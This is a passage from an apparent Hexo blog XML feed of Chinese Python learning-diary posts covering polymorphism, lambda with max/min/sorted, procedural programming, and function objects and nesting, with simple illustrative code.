class="string">&#x27;Foo.f1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">b=Bar()</span><br><span class="line">b.f2() <span class="comment">#在父类中找到f2方法，进而调用b._Foo__f1()方法，同样是在父类中找到该方法</span></span><br><span class="line">Foo.f2</span><br><span class="line">Foo.f1</span><br></pre></td></tr></table></figure><p>关于继承 , 要求 : 能看懂</p><h2 id="3、多态"><a href="#3、多态" class="headerlink" title="3、多态"></a>3、多态</h2><p>关于多态 , 是在面向对象中最抽象和最难理解的一个特征 , 同时在python这门编程语言中对多态的实现在语法层面上 , 又是那么的不明显 , 导致很多人不理解这个多态</p><p><strong>是什么多态</strong></p><p>多态指的是一类事物有多种形态，比如动物这类事物有多种形态：猫、狗、猪 , 水有水蒸气 , 液体水 , 冰这些形态</p><p>看代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Persion类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Persion</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):  <span class="comment"># 吃饭</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Boy</span>(<span class="title class_ inherited__">Persion</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, gender=<span class="string">&quot;男&quot;</span></span>):</span><br><span class="line">        <span class="comment"># 在子类中 , 调用父类的 __init__ 方法 , 简单理解: super()返回父类</span></span><br><span class="line">        <span class="built_in">super</span>().__init__(name)</span><br><span class="line">        self.gender = gender</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):  <span class="comment"># 男孩喜欢吃肉</span></span><br><span class="line">        <span class="built_in">super</span>().eat()  <span class="comment"># 调用父类的eat方法</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> like eat meat !!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Girl</span>(<span class="title class_ inherited__">Persion</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, gender=<span class="string">&quot;女&quot;</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(name)</span><br><span class="line">        self.gender = gender</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">self</span>):  <span class="comment"># 女孩喜欢吃米饭</span></span><br><span class="line">        <span class="built_in">super</span>().eat()  <span class="comment"># 在子类中 , 调用父类的eat方法 , 简单理解: super()返回父类</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;self.name&#125;</span> like eat rice !!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多态的体现，既可以是boy，也可以是个girl</span></span><br><span class="line"><span class="comment"># 只要实现了eat方法 , 我不管你是什么形态</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">eat</span>(<span class="params">persion</span>):</span><br><span class="line">    persion.eat()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">boy = Boy(<span class="string">&quot;alex&quot;</span>)</span><br><span class="line">girl = Girl(<span class="string">&quot;lili&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收的类型 可以是女孩/男孩 只要实现了eat方法即可</span></span><br><span class="line">eat(boy)</span><br><span class="line">eat(girl)</span><br></pre></td></tr></table></figure><h1 id="五、面向对象和面向过程的区别"><a href="#五、面向对象和面向过程的区别" class="headerlink" title="五、面向对象和面向过程的区别"></a>五、面向对象和面向过程的区别</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">面向对象是基于面向过程的编程思想</span><br><span class="line"></span><br><span class="line">面向过程：强调的是实现每一个功能的步骤</span><br><span class="line"></span><br><span class="line">面向对象：强调的是对象，然后由对象去调用功能</span><br></pre></td></tr></table></figure><h1 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">知道语法 , 知道属性是如何调用的 , 方法如何调用的</span><br><span class="line">编写程序 , 不使用面向对象仍然可以完成需求</span><br><span class="line"></span><br><span class="line">大家对面向对象的迷惑点是 , 什么情况下使用面向对象 , 面向对象中的属性和方法应该怎么定义</span><br><span class="line">我写的代码符不符合面向对象标准 </span><br><span class="line"></span><br><span class="line">面向对象编程 , 不需要必须实现继承和多态 我单独的一个封装也是面向对象编程</span><br><span class="line"></span><br><span class="line">对新手朋友来说最难的实际上是面向对象的设计 , 当你拿到一个需求的时候 , 你不知道该怎么设计 , 即怎么的封装</span><br><span class="line">属性和方法怎么定义 , 进而你会觉得面向对象难</span><br><span class="line"></span><br><span class="line">有一个方法 , 你先把你想要实现的程序用到的数据和功能 , 拆分出来 , 然后再编写程序 , 因为面向对象一定是对属性(数据)和方法(功能的封装) , 然后再编写代码</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（十五）</title>
      <link href="/2022/07/11/python_fifteen/"/>
      <url>/2022/07/11/python_fifteen/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403135850438.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章记录的是Python匿名函数和面向过程编程的知识。&#x3D;&#x3D;</p><h1 id="一、lambda"><a href="#一、lambda" class="headerlink" title="一、lambda"></a>一、lambda</h1><p>对比使用def关键字创建的是有名字的函数，使用lambda关键字创建则是没有名字的函数，即匿名函数<br>语法如下：<br>lambda 参数1，参数2：返回值<br><strong>[定义]</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">lambda</span> x, y: x + y  <span class="comment"># lambda自带一个return</span></span><br><span class="line"><span class="built_in">print</span>(<span class="keyword">lambda</span> x, y: x + y)</span><br></pre></td></tr></table></figure><p><strong>[调用]</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 调用匿名函数 : 函数内存地址 + ()</span></span><br><span class="line"><span class="comment"># 方式一:</span></span><br><span class="line"></span><br><span class="line">res = (<span class="keyword">lambda</span> x, y: x + y)(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方式2:</span></span><br><span class="line">x = (<span class="keyword">lambda</span> x, y: x + y)</span><br><span class="line">res1 = x(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(res1)</span><br></pre></td></tr></table></figure><p>以上都不是匿名函数的真正调用方式 , 因为匿名函数的精髓就在于没有名字 , 你这又搞出来一个名字 , 那你干嘛不 </p><p>用有名函数 def 关键字定义呢?</p><p><strong>[应用场景]</strong></p><p>匿名函数与有名函数有相同的作用域，但是匿名意味着引用计数为0，使用一次就释放，所以匿名函数用于临时使</p><p>用一次的场景，匿名函数通常与其他函数配合使用</p><p><strong>[max函数]</strong></p><p>接收一个可迭代对象 , 然后比较 , 返回最大值 , 可设置比较的依据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需求:打印出薪资最高的那个人的名字</span></span><br><span class="line">salary_dic = &#123;<span class="string">&#x27;tom&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;alex&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;jack&#x27;</span>: <span class="number">200</span>&#125;</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">max</span>(salary_dic)       </span><br><span class="line"><span class="comment"># max直接迭代字典,只会把字典的key作为比较依据,我们需要把值作为依据,可指定key的值</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">return</span> salary_dic[k]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = <span class="built_in">max</span>(salary_dic, key=func)  </span><br><span class="line"><span class="comment"># max会把迭代的每一个值传递给key指定的函数内存地址当做实参,然后通过函数的返回值作为比较的依据</span></span><br><span class="line"><span class="built_in">print</span>(res)     <span class="comment"># alex</span></span><br></pre></td></tr></table></figure><p>但是你发现了吗 , func这个函数 , 只适用于这次比较大小 , 没有其他可用的作用了 , 既然只用一次 , 那么用匿名函</p><p>数岂不美哉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># k就是函数的形参,实参在代码层面你是看不到的,但是执行起来会传参</span></span><br><span class="line">res = <span class="built_in">max</span>(salary_dic, key=<span class="keyword">lambda</span> k: salary_dic[k])</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p><strong>[min函数]</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">salary_dic = &#123;<span class="string">&#x27;tom&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;alex&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;jack&#x27;</span>: <span class="number">200</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># max取最大,min取最小</span></span><br><span class="line">res1 = <span class="built_in">min</span>(salary_dic, key=<span class="keyword">lambda</span> k: salary_dic[k])</span><br><span class="line"><span class="built_in">print</span>(res1)</span><br></pre></td></tr></table></figure><p><strong>[stored函数]</strong></p><p><code>sorted 排序</code>,也可以指定比较依据,默认<code>reserve=False</code>,是从小到大排列,可以设为True,从大到小排列</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">salary_dic = &#123;<span class="string">&#x27;tom&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;alex&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;jack&#x27;</span>: <span class="number">200</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res2 = <span class="built_in">sorted</span>(salary_dic, key=<span class="keyword">lambda</span> k: salary_dic[k])</span><br><span class="line"><span class="built_in">print</span>(res2)</span><br></pre></td></tr></table></figure><h1 id="二、面向过程编程"><a href="#二、面向过程编程" class="headerlink" title="二、面向过程编程"></a>二、面向过程编程</h1><h2 id="1、-介绍"><a href="#1、-介绍" class="headerlink" title="1、 介绍"></a>1、 介绍</h2><p><code>面向过程</code>(Procedure Oriented)是一种以<code>过程为中心</code>的编程思想，是一种基础的方法，它考虑的是实际地实现</p><p>基于该思想编写程序就好比一条流水线首先分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，</p><p>使用的时候一个一个依次调用就可以了</p><p>比如拿学生早上起来去上学这件事说明面向过程，粗略的可以将过程拟为：</p><p>(1) 起床</p><p>(2) 穿衣</p><p>(3) 洗脸刷牙</p><p>(4) 去学校</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一步,起床</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_up</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;我起床了&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 第二步,穿衣</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dress</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;穿衣服&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 第三步,洗脸刷牙</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brush_teeth</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;刷牙,洗脸&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 第四步,去学校</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go_school</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;去学校&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():    </span><br><span class="line">    get_up()</span><br><span class="line">    dress()</span><br><span class="line">    brush_teeth()</span><br><span class="line">    go_school()</span><br><span class="line">    </span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>这4步就是一步一步地完成，它的顺序很重要，你只需要一个一个地实现就行了。而如果是用<a href="https://baike.baidu.com/item/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1">面向对象</a>的方法的</p><p>话，可能就只抽象出一个学生的类，它包括这四个方法，但是具体的顺序就不一定按照原来的顺序。</p><h2 id="2、-优缺点"><a href="#2、-优缺点" class="headerlink" title="2、 优缺点"></a>2、 优缺点</h2><p><strong>[优点]</strong></p><p>复杂问题流程化 , 进而简单化 , 这也是计算机最本质的工作模式 , 最喜欢的工作模式 , 一步一步的来</p><p><strong>[缺点]</strong></p><p>扩展性非常差</p><h2 id="3、-应用场景"><a href="#3、-应用场景" class="headerlink" title="3、 应用场景"></a>3、 应用场景</h2><ul><li>不是所有的软件都需要频繁更迭 : 比如编写脚本</li><li>即便是一个软件需要频繁更迭，也不并不代表这个软件所有的组成部分都需要频繁迭代</li></ul><p>总结</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对于我们 python&amp;安全 , 基本上刚开始写的都是一些小脚本 , 这样写就ok了</span><br><span class="line">如果你是做大型项目 , 这个需要学习一下系统的 python开发</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程学习 </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习日记（十四）</title>
      <link href="/2022/07/10/python_forteen/"/>
      <url>/2022/07/10/python_forteen/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/f54ac64acb7347f796b984da66c66201-20230403135907117.png" alt="在这里插入图片描述"><br>&#x3D;&#x3D;本篇文章记录的是Python函数对象和嵌套的知识。&#x3D;&#x3D;</p><h1 id="一、函数对象"><a href="#一、函数对象" class="headerlink" title="一、函数对象"></a>一、函数对象</h1><p>精髓：可以把函数名当成变量名去用<br>函数名和变量名一样，都是指向的是内存地址<br>#二、函数名的用途<br>##1、可以赋值<br>把一个函数名赋值给另一个变量名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># func=函数的内存地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">f=func        </span><br><span class="line"><span class="built_in">print</span>(func)   <span class="comment"># &lt;function func at 0x000001E78F9B3EA0&gt; </span></span><br><span class="line"><span class="built_in">print</span>(f)      <span class="comment"># &lt;function func at 0x000001E78F9B3EA0&gt;</span></span><br></pre></td></tr></table></figure><h2 id="2、当参数"><a href="#2、当参数" class="headerlink" title="2、当参数"></a>2、当参数</h2><p>函数名也可以当做参数传给另一个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">x</span>):  <span class="comment"># × = func的内存地址#</span></span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    x()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foo(func)  <span class="comment"># foo( func的内存地址)</span></span><br></pre></td></tr></table></figure><h2 id="3、当返回值"><a href="#3、当返回值" class="headerlink" title="3、当返回值"></a>3、当返回值</h2><p>函数名也可以当函数的返回值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = foo(func)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h2 id="4、当元素"><a href="#4、当元素" class="headerlink" title="4、当元素"></a>4、当元素</h2><p>函数名可以当做容器类型的一个元素</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;func函数: &#x27;</span>,func)</span><br><span class="line">    </span><br><span class="line">l=[func,]</span><br><span class="line"><span class="built_in">print</span>(l)</span><br><span class="line">l[<span class="number">0</span>]()        <span class="comment"># 调用func函数</span></span><br><span class="line">dic=&#123; <span class="string">&#x27;k1&#x27;</span> :func&#125;</span><br><span class="line"><span class="built_in">print</span>(dic)</span><br><span class="line">dic[<span class="string">&#x27;k1&#x27;</span>]()  <span class="comment"># 调用func函数</span></span><br></pre></td></tr></table></figure><h2 id="5、小练习"><a href="#5、小练习" class="headerlink" title="5、小练习"></a>5、小练习</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;登录功能&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transfer</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;转账功能&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_balance</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;查询余额&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_password</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;修改密码&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 巧用数据类型</span></span><br><span class="line">dic = &#123;</span><br><span class="line">    <span class="comment"># &#x27;1&#x27;: login,</span></span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: (<span class="string">&#x27;退出&#x27;</span>, <span class="literal">None</span>),</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: [<span class="string">&#x27;登录&#x27;</span>, login],</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: [<span class="string">&#x27;转账&#x27;</span>, transfer],</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: [<span class="string">&#x27;查询余额&#x27;</span>, check_balance],</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: [<span class="string">&#x27;更改密码&#x27;</span>, change_password],</span><br><span class="line">    <span class="comment"># &#x27;2&#x27;: transfer,</span></span><br><span class="line">    <span class="comment"># &#x27;3&#x27;: check_balance,</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> dic.items():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(key, value[<span class="number">0</span>]))</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&#x27;请输入编号:&#x27;</span>).strip()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> choice.isdigit():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;必须输入编号,憨批&#x27;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> choice <span class="keyword">in</span> dic:</span><br><span class="line">        dic[choice][<span class="number">1</span>]()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;你输入的命令不存在,憨批&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="三、函数的嵌套"><a href="#三、函数的嵌套" class="headerlink" title="三、函数的嵌套"></a>三、函数的嵌套</h1><h2 id="1、函数的嵌套调用"><a href="#1、函数的嵌套调用" class="headerlink" title="1、函数的嵌套调用"></a>1、函数的嵌套调用</h2><p>在调用一个函数的过程又调用其他的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;调用了func1函数&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;调用了func2函数&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func3</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;调用了func3函数&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    func1()</span><br><span class="line">    func2()</span><br><span class="line">    func3()</span><br></pre></td></tr></table></figure><p>应用场景：<br>#把各个小功能（小函数），封装到一个大功能（大函数）里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">max2</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x <span class="keyword">if</span> x &gt; y <span class="keyword">else</span> y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 比较4个参数的大小</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">max4</span>(<span class="params">a, b, c, d</span>):</span><br><span class="line">    <span class="comment"># 比较a,b得到res1</span></span><br><span class="line">    res1 = max2(a, b)</span><br><span class="line">    <span class="comment"># 比较res1,c,得到res2</span></span><br><span class="line">    res2 = max2(res1, c)</span><br><span class="line">    <span class="comment"># 比较res2,d ,得到res3</span></span><br><span class="line">    res3 = max2(res2, d)</span><br><span class="line">    <span class="keyword">return</span> res3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(max4(<span class="number">7838237</span>, <span class="number">9859</span>, <span class="number">949</span>, <span class="number">90</span>))</span><br></pre></td></tr></table></figure><h2 id="2、函数的嵌套定义"><a href="#2、函数的嵌套定义" class="headerlink" title="2、函数的嵌套定义"></a>2、函数的嵌套定义</h2><p>在函数内定义其它的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        <span class="comment"># 举例:</span></span><br><span class="line"><span class="comment"># 求圆的周长和面积,但是只在圆内调用,在其他地方不用</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> pi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">circle</span>(<span class="params">radius, action=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;radius:半径 action为0是求周长 action为1是求面积 &quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_perimeter</span>(<span class="params">radius</span>):</span><br><span class="line">        <span 